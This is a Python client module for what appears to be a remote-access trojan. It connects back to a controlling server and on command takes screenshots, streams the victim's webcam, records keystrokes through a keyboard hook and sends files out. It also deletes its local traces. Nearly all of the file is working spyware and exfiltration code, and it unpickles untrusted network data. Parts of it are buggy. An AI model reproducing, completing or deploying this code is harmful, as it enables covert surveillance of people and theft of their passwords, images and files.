from PIL import Image, ImageGrab
import os
import pickle
import struct
import time
from socket import *
import cv2
import pyxhook
import sys
from datetime import datetime
import threading

SERVER_IP = "localhost"

class NoMessageError(Exception):
    def __init__(self, msg):
        self._msg = "\n" + msg + "\n"

    @property
    def msg(self):
        return self._msg

class ShutdownException(Exception):
    def __init__(self, msg):
        self._msg = "\n" + msg + "\n"

    @property
    def msg(self):
        return self._msg
        
# class adapted from https://stackoverflow.com/questions/323972/is-there-any-way-to-kill-a-thread
class StoppableThread(threading.Thread):
    """Thread class with a stop() method. The thread itself has to check
    regularly for the stopped() condition."""

    def __init__(self,  *args, **kwargs):
        super(StoppableThread, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

class Client():
    def __init__(self, client_socket):
        self._socket = client_socket
        self._connected = True
        
        self._keylog_thread = None
        self._orig_cwd = os.path.abspath(os.getcwd())
        self._cwd = os.path.abspath(os.getcwd())
    
    @property
    def connected(self):
        return self._connected

    def receive(self, msg_len):
        print("receiving a message")
        if msg_len <= 4096:
            msg = pickle.loads(self._socket.recv(msg_len))
            print(msg)
            return msg
        
        received = 0
        msg = ""
        
        while received < msg_len:
            print("in loop")
            if msg_len - received > 4096:
                msg += self._socket.recv(4096)
                received += 4096
            else:
                msg += self._socket.recv(msg_len - received)
                received = msg_len
        
        sys.exit(1)
        return pickle.load(msg)
    
    def send(self, data):
        print("sending a message")
        msg = pickle.dumps(data)
        msg_len = str(len(msg)).zfill(1024).encode()

        self._socket.sendall(msg_len + msg)
        print("message sent")
        
    
    def screenshot(self, msg):
        print("screenshotting")
        im = ImageGrab.grab(bbox = None)
        filename = "{}/Screenshot_{}".format(self._orig_cwd, time.time())
        im.save(filename, "PNG")
        
        filesize = os.path.getsize(filename)
        
        msg_len = str(filesize).zfill(1024).encode()
        self._socket.send(msg_len)
        
        with open(filename, "rb") as f:
            file_content = f.read(4096)
            while file_content:
                self._socket.send(file_content)
                file_content = f.read(4096)
        
        print("sent screenshot")

        os.remove(filename)     # delete screenshot on clients computer

    def exit(self, msg):
        self._connected = False
        if self._keylog_thread != None:
            self._keylog_thread.stop()
            self._keylog_thread.join()
            self._keylog_thread = None
            os.remove("keylogs.txt")
        raise ShutdownException("Server shutting down")

    def webcam(self, msg):
        print("received webcam command")
        # set up a new socket to send webcam data
        video_socket = socket(AF_INET, SOCK_STREAM)
        video_socket.connect((SERVER_IP, 9999))
        
        print("connected to server video socket")
        
        video_cap = cv2.VideoCapture(0)
        
        print("starting video capture")
        
        while True:
            ret, video_frame = video_cap.read()
            data = pickle.dumps(video_frame)
            framesize = str(len(data)).zfill(1024).encode()
            video_socket.send(framesize)
            video_socket.sendall(data)
            try:
                end = self._socket.recv(1).decode()
                if end == "1":
                    break
            except:
                break
        
        self._socket.send("1".encode())     # final ack that client has received the end message
        video_socket.close()
    
    def kbevent(self,event):
        with open('{}/keylogs.txt'.format(self._orig_cwd), 'a+') as f:
            f.write("Time:{} Key:{}\n".format(datetime.now().strftime("%Y/%m/%d-%H:%M:%S"), event.Key))
    
    def create_keylog_process(self):
        thread = threading.currentThread()
        #Create hookmanager
        hookman = pyxhook.HookManager()
        #Define our callback to fire when a key is pressed down
        hookman.KeyDown = self.kbevent
        #Hook the keyboard
        hookman.HookKeyboard()
        #Start our listener
        hookman.start()
        
        while not thread.stopped():
            time.sleep(0.1)
        
        #Close the listener when we are done
        hookman.cancel()
    
    def keylog(self, msg):
        filename = "{}/keylogs.txt".format(self._orig_cwd)
        
        if msg["flag"] == "start":
            # start keylogging
            self._keylog_thread = StoppableThread(target=self.create_keylog_process)
            self._keylog_thread.daemon=True
            self._keylog_thread.start()
        
        else:
            # send keylog file
            filesize = os.path.getsize(filename)
        
            msg_len = str(filesize).zfill(1024).encode()
            self._socket.send(msg_len)
            
            with open(filename, "rb") as f:
                file_content = f.read(4096)
                while file_content:
                    self._socket.send(file_content)
                    file_content = f.read(4096)
            
        if msg["flag"] == "stop":
            self._keylog_thread.stop()
            self._keylog_thread.join()
            self._keylog_thread = None
            os.remove(filename)
    
    def pwd(self, msg):
        msg = self._cwd
        msg_len = str(len(msg)).zfill(1024).encode()
        
        self.send(msg)
            
    def ls(self, msg):
        msg = os.listdir()
        msg_len = str(len(msg)).zfill(1024).encode()
        
        self.send(msg)
    
    def cd(self, msg):
        path = msg["path"]
        orig_dir = self._cwd
        os.chdir(path)
        new_dir = os.path.abspath(os.getcwd())
        msg = ""
        
        if new_dir != orig_dir:
            self._cwd = new_dir
            msg = "Directory changed to {}".format(new_dir)
        else:
            msg = "Directory unchanged to {}".format(orig_dir)
        
        self.send(msg)
        
    def copy(self, msg):
        filename = msg["filename"]
        if not os.path.isfile(filename):
            self.send("fail")
            return
            
        self.send("success")
        filesize = os.path.getsize(filename)
        
        msg_len = str(filesize).zfill(1024).encode()
        self._socket.send(msg_len)
        
        with open(filename, "rb") as f:
            file_content = f.read(4096)
            while file_content:
                self._socket.send(file_content)
                file_content = f.read(4096)
        
        print("sent file {}".format(filename))
    
